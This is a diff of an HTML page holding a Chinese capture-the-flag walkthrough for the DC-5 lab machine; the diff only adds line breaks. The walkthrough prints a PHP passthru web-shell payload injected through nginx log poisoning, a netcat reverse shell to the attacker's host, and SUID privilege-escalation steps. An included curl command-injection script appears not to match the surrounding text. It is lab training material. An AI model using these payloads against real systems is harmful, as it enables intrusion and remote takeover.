@@ -7573,32 +7573,32 @@
   <h1>DC 5</h1>
 
 <h2 id="dc-5">DC-5</h2>
-<p>使用 nmap 扫描端口
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586783525210-4be1a5ef-66b0-4ef5-b4e5-d68b72303580-535607.png" />
-在 contact 填写完以后，返回一个 thankyou.php 有文件包含漏洞
+<p>使用 nmap 扫描端口<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586783525210-4be1a5ef-66b0-4ef5-b4e5-d68b72303580-535607.png" /><br />
+在 contact 填写完以后，返回一个 thankyou.php 有文件包含漏洞<br />
 <img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586783947285-981e0d98-05d2-4f7b-9915-379cd2c9b140-360622.png" /></p>
-<p>！？怎么找到的？？
+<p>！？怎么找到的？？<br />
 大佬们通过扫目录，扫出来的结果去看了一下（字典实在是太大，我就不扫了，白费劲）</p>
-<p>发现这个页面每次加载都是不一样的，然后
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784437529-a8b24731-6639-4f55-b49c-b26c117e1469-452665.png" />
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784488779-567a906f-0d59-4afa-b77a-6c680d73c045-146346.png" />
-在 thankyou.php 也有这样的情况，所以有理由怀疑是 thankyou.php 包含了这个文件
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784562489-8fb7e5a7-c356-4898-97a1-34faab51ebcf-421238.png" />
-同时 fuzz 试出来一个 file 参数，mark 一下，收集一些字典整理一下，好久之前就应该做这个事情了
+<p>发现这个页面每次加载都是不一样的，然后<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784437529-a8b24731-6639-4f55-b49c-b26c117e1469-452665.png" /><br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784488779-567a906f-0d59-4afa-b77a-6c680d73c045-146346.png" /><br />
+在 thankyou.php 也有这样的情况，所以有理由怀疑是 thankyou.php 包含了这个文件<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586784562489-8fb7e5a7-c356-4898-97a1-34faab51ebcf-421238.png" /><br />
+同时 fuzz 试出来一个 file 参数，mark 一下，收集一些字典整理一下，好久之前就应该做这个事情了<br />
 在扫描端口阶段注意到这是个 nginx 的服务，通过包含日志文件来 getshell</p>
-<p>带着这个访问：&lt;?php passthru($_GET['yichen']); ?&gt;
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826129278-af7fa54b-488f-4ecd-a2c3-157a2ee086cc-573096.png" />
+<p>带着这个访问：&lt;?php passthru($_GET['yichen']); ?&gt;<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826129278-af7fa54b-488f-4ecd-a2c3-157a2ee086cc-573096.png" /><br />
 然后如包含日志文件 /var/log/nginx/access.log，同时可以跟上命令了</p>
-<p><img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826089207-d2b21e59-daa5-4f09-800b-8f5ca804f250-566000.png" />
-那既然这样，就 nc 反弹一个 shell 把，在 kali 上监听一个 6666 端口
+<p><img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826089207-d2b21e59-daa5-4f09-800b-8f5ca804f250-566000.png" /><br />
+那既然这样，就 nc 反弹一个 shell 把，在 kali 上监听一个 6666 端口<br />
 <code>nc -lvp 6666</code></p>
-<p>浏览器访问一下就连上了，192.168.149.163/thankyou.php?file=/var/log/nginx/access.log&amp;yichen=nc 192.168.149.141 6666 -c /bin/bash
+<p>浏览器访问一下就连上了，192.168.149.163/thankyou.php?file=/var/log/nginx/access.log&amp;yichen=nc 192.168.149.141 6666 -c /bin/bash<br />
 <img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826466617-850c9f22-e2d4-432c-8648-4a0a0eedf2b5-487356.png" /></p>
 <h3 id="_1">提权</h3>
-<p>suid 提权：<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>
-先看一下有没有能用的
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826709528-ab3d46b9-6aa1-4efd-9270-f7aaa18a8c98-318695.png" />
-搜一下 <code>searchsploit screen</code>
+<p>suid 提权：<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br />
+先看一下有没有能用的<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826709528-ab3d46b9-6aa1-4efd-9270-f7aaa18a8c98-318695.png" /><br />
+搜一下 <code>searchsploit screen</code><br />
 <img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586826676246-aeb86595-b83d-43e8-b4ac-0a59c5ef8e76-924817.png" /></p>
 <p>分别把两个C语言文件拷出来，按照 sh 脚本的命令编译好了（然后把前面的去掉就可以了）</p>
 <pre><code class="language-shell">#!/bin/sh
@@ -7608,10 +7608,10 @@ while true;do
  curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;${cmd};echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot; &quot;${URL}&quot; | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
 done
 </code></pre>
-<p>用vi打开该sh文件，使用 :set ff=unix 保存
-然后再通过 nc 传过去
-<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586852100408-f6dbf104-0af0-490e-be91-d22eb74b9dbb-874259.png" />
-执行脚本提权
+<p>用vi打开该sh文件，使用 :set ff=unix 保存<br />
+然后再通过 nc 传过去<br />
+<img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586852100408-f6dbf104-0af0-490e-be91-d22eb74b9dbb-874259.png" /><br />
+执行脚本提权<br />
 <img alt="image.png" src="../img/551828_oa6i2oi88rnkwucg/1586852257078-ed95c0f3-3639-4919-a68d-6f9282296532-891040.png" /></p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/mvdmkl">https://www.yuque.com/hxfqg9/web/mvdmkl</a></p>
